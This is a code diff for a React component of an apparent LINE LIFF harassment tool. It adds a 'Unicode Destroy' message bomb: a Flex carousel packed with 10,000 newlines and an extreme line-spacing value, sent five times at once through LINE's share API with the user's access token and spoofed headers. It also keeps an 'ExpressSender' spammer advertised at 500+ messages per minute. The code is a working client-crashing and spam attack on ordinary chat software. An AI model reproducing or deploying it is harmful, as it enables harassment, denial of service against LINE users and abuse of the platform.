@@ -9,22 +9,111 @@ export default function Send(props) {
 
     function sendFlexUnicode() {
         console.log("atk!")
-        let template = `
-    [{"type": "template",   "altText": "{unicode}",   "template": {     "type": "buttons",     "thumbnailImageUrl": "https://amex.deno.dev/favicon.ico",     "imageAspectRatio": "rectangle",     "imageSize": "cover",     "imageBackgroundColor": "#000000",     "title": "ヨシフマン",     "text": "Bomb",     "actions": [       {         "type": "uri",         "label": "m9(^Д^)ﾌﾟｷﾞｬｰ",         "uri": "https://Twitter.com/amex2189"       }   ]   } } ]
-    `
 
-        let unicode1 = "";
+        let unicode = `\n`.repeat(10000);
 
-        let num = parseInt(prompt("長さ ~2500"));
-        for (let i = 0; i < num; i++) {
-            unicode1 += decodeURIComponent("%D9%8B%D9%99");
-        }
+        let flex_obj = `{
+            type: "flex",
+            altText: "@bomb",
+            contents: {
+              type: "carousel",
+              contents: [
+                {
+                  type: "bubble",
+                  body: {
+                    type: "box",
+                    layout: "horizontal",
+                    contents: [
+                      {
+                        type: "text",
+                        text: "bomb!",
+                        wrap: true,
+                        size: "2xl",
+                        weight: "bold",
+                        color: "#000000",
+                        lineSpacing: "1145141919px",
+                      },
+                    ],
+                  },
+                },
+                {
+                  type: "bubble",
+                  body: {
+                    type: "box",
+                    layout: "horizontal",
+                    contents: [
+                      {
+                        type: "text",
+                        text: "bomb!",
+                        wrap: true,
+                        size: "2xl",
+                        weight: "bold",
+                        color: "#000000",
+                        lineSpacing: "1145141919px",
+                      },
+                    ],
+                  },
+                },
+                {
+                  type: "bubble",
+                  body: {
+                    type: "box",
+                    layout: "horizontal",
+                    contents: [
+                      {
+                        type: "text",
+                        text: "bomb!",
+                        wrap: true,
+                        size: "2xl",
+                        weight: "bold",
+                        color: "#000000",
+                        lineSpacing: "1145141919px",
+                      },
+                    ],
+                  },
+                },
+                {
+                  type: "bubble",
+                  body: {
+                    type: "box",
+                    layout: "horizontal",
+                    contents: [
+                      {
+                        type: "text",
+                        text: ${unicode},
+                        wrap: true,
+                        size: "2xl",
+                        weight: "bold",
+                        color: "#000000",
+                        lineSpacing: "1145141919px",
+                      },
+                    ],
+                  },
+                },
+              ],
+            },
+          };
+        `;          
 
-        template = template.replaceAll("{unicode}", unicode1)
+        const auth = "Bearer " + liff.getAccessToken();
+        const msg_obj = JSON.parse(flex_obj);
 
-        liff.sendMessages(
-            JSON.parse(template)
-        )
+        const headers = {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Authorization': auth,
+            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
+            'Referer': 'https://line-toolbox.f5.si/'
+        };
+
+        fetch('https://api.line.me/message/v3/share', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({
+                messages: [msg_obj, msg_obj, msg_obj, msg_obj, msg_obj]
+            }),
+            compressed: true
+        })
     }
 
     // (c): amex/amex2189 無断使用禁止 発覚時 5000円徴収
@@ -44,7 +133,7 @@ export default function Send(props) {
             'Referer': 'https://line-toolbox.f5.si/'
         };
 
-        const numRequests = 10;
+        const numRequests = 5;
 
         const sendRequest = async () => {
             try {
@@ -78,10 +167,9 @@ export default function Send(props) {
     return (
         <>
             <div>
-                <t>Unicode Destroy 未実装</t>
+                <t>Unicode Destroy α</t>
                 <t class="desc">Unicodeが制限された今でも使える新型Unicodeです。</t>
-                1: <button onClick={() => { sendFlexUnicode() }}>Send</button> <br />
-
+                1個: <button onClick={() => { sendFlexUnicode() }}>Send</button> <br />
                 <t>ExpressSender</t>
                 <t class="desc">最高速度を出せます。1分 500+ メッセージ</t>
                 <t>
@@ -95,7 +183,7 @@ export default function Send(props) {
                     />
                 </t>
                 <t>
-                    <button onClick={() => { expressSend();}}>Send</button>
+                    <button onClick={() => { expressSend(); }}>Send</button>
                 </t>
             </div>
         </>
